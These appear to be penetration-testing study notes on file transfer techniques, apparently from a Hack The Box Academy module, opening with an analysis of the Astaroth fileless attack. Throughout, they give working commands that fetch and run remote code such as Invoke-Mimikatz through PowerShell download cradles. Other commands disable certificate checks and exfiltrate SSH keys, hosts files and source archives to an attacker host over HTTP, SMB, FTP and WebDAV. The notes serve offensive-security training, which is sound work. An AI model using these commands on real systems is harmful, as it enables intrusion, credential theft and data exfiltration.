# File Transfer Methods

Example of APT being used: [Microsoft Astaroth Attack](https://www.microsoft.com/en-us/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/)

The blog post starts out talking about [fileless threats](https://www.microsoft.com/en-us/security/blog/2018/01/24/now-you-see-me-exposing-fileless-malware/). The term `fileless` suggests that a threat doesn't come in a file, they use legitimate tools built into a system to execute an attack

The `Astaroth attack` generally followed these steps:&#x20;

1. A malicious link in a spear-phishing email led to an LNK file.&#x20;
2. When double-clicked, the LNK file caused the execution of the [WMIC tool](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic) with the "/Format" parameter, which allowed the download and execution of malicious JavaScript code.&#x20;
3. The JavaScript code, in turn, downloads payloads by abusing the [Bitsadmin tool](https://docs.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool).

<figure><img src="https://academy.hackthebox.com/storage/modules/24/fig1a-astaroth-attack-chain.png" alt=""><figcaption></figcaption></figure>

## Download Operations

### Powershell Baes64 Encode & Decode

If we have access to a terminal, we can encode a file to a base64 string, copy its contents from the terminal and perform the reverse operation, decoding the file in the original content

An essential step in using this method is to ensure the file you encode and decode is correct. We can use [md5sum](https://man7.org/linux/man-pages/man1/md5sum.1.html)

```bash
md5sum <file>
// 4e301756a07ded0a2dd6953abf015278  id_rsa
cat <file> |base64 -w 0;echo
// LS0tLS1CRUdJTiBPUEVOU1N..
```

We can paste this into a PowerShell to decode it

```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1N.."))
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
// Algorithm       Hash                                                                   Path
// ---------       ----                                                                   ----
// MD5             4E301756A07DED0A2DD6953ABF015278    
```

### Powershell Web Downloads

PowerShell offers many file transfer options. In any version of PowerShell, the [System.Net.WebClient](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0) class can be used to download a file over `HTTP`, `HTTPS` or `FTP`. The following [table](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-6.0) describes WebClient methods for downloading data from a resource:

| **Method**                                                                                                               | **Description**                                                                                                            |
| ------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------- |
| [OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)                       | Returns the data from a resource as a [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0). |
| [OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)             | Returns the data from a resource without blocking the calling thread.                                                      |
| [DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)               | Downloads data from a resource and returns a Byte array.                                                                   |
| [DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)     | Downloads data from a resource and returns a Byte array without blocking the calling thread.                               |
| [DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)               | Downloads data from a resource to a local file.                                                                            |
| [DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)     | Downloads data from a resource to a local file without blocking the calling thread.                                        |
| [DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)           | Downloads a String from a resource and returns a String.                                                                   |
| [DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0) | Downloads a String from a resource without blocking the calling thread.                                                    |

File download example using Net.WebClient and DownloadFile"

```powershell
PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```

PowerShell DownloadString - Fileless Method:

```powershell
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

PowerShell 3.0+ includes Invoke-Web-Request:

```powershell
PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

Harmj0y has compiled an extensive list of PowerShell download cradles [here](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)

### Common Errors

If IE first launch hasn't happened, use the -UseBasicParsing param:

```powershell
Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

If certificate is not trusted in a SSL/TLS secure channel:

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
// Error thrown
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

## SMB Downloads

We can use SMB to download files from our Pwnbox easily. We need to create an SMB server in our Pwnbox with [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) from Impacket and then use `copy`, `move`, PowerShell `Copy-Item`, or any other tool that allows connection to SMB

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare
copy \\192.168.220.133\share\nc.exe
```

If newer Windows blocks unauth'd access, we can set a username and password and mount the server onto our windows target machine:

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
net use n: \\192.168.220.133\share /user:test test
copy n:\nc.exe
```

## FTP Downloads

We can configure an FTP Server in our attack host using Python3 `pyftpdlib` module. It can be installed with the following command:

```bash
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21
```

To transfer from FTP using PowerShell:

<pre class="language-bash"><code class="lang-bash"><strong> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
</strong></code></pre>

If we get a shell but it is not interactive, we can create an FTP command file to download a file:

```bash
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt

ftp> open 192.168.49.128 // In FTP server
ftp> GET file.txt

more file.txt
```

## Upload Operations

### PowerShell Base64 Encode & Decode

This is a reverse of the previous Base64 section, where we encode a file so we can decode it on our host

```powershell
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
```

To decode in Linux:

```bash
echo <string> | base64 -d > hosts
md5sum hosts
```

### PowerShell Web Uploads

PowerShell doesn't have a built-in function for upload operations, but we can use `Invoke-WebRequest` or `Invoke-RestMethod` to build our upload function

For our web server, we can use [uploadserver](https://github.com/Densaugeo/uploadserver), an extended module of the Python [HTTP.server module](https://docs.python.org/3/library/http.server.html), which includes a file upload page

```bash
pip3 install uploadserver
python3 -m uploadserver
```

Now we can use a PowerShell script [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) which uses `Invoke-RestMethod` to perform the upload operations. The script accepts two parameters `-File`, which we use to specify the file path, and `-Uri`, the server URL where we'll upload our file

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

### PowerShell Base64 Web Upload

Another way to use PowerShell and base64 encoded files for upload operations is by using `Invoke-WebRequest` or `Invoke-RestMethod` together with Netcat.&#x20;

We use Netcat to listen in on a port we specify and send the file as a `POST` request. Finally, we copy the output and use the base64 decode function to convert the base64 string into a file

```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

We catch the base64 data with Netcat and use the base64 application with the decode option to convert the string

```bash
nc -lvnp 8000
Ctrl + C
echo <string> | base64 -d -w 0 > hosts
```

### SMB Uploads

Most companies don't let SMB protocol out of their internal network. An alternative is to run SMB over HTTP or HTTPS with `WebDav`. `WebDAV` [(RFC 4918)](https://datatracker.ietf.org/doc/html/rfc4918) is an extension of HTTP, the internet protocol that web browsers and web servers use to communicate with each other. The `WebDAV` protocol enables a webserver to behave like a fileserver

#### Using WebDav

We need to install two Python modules, `wsgidav` and `cheroot` and use the `wsgidav` app in the target directory

```bash
sudo pip3 install wsgidav cheroot

sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 

# Inside the directory:
dir \\192.168.49.128\DavWWWRoot
# DavWWWRoot is a special keyword recognized by the Windows Shell. 
# No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the 
# Mini-Redirector driver, which handles WebDAV requests that you are connecting to the 
# root of the WebDAV server
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\

# Note: If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the 
# same way we set it up for download operations.
```

### FTP Uploads

We can use PowerShell or a FTP client. Before we start our FTP Server using the Python module `pyftpdlib`, we need to specify the option `--write` to allow clients to upload files to our attack host

```bash
sudo python3 -m pyftpdlib --port 21 --write
```

Then use the PowerShell upload function

```powershell
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

Creating a command file for a FTP client to upload:

```bash
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```

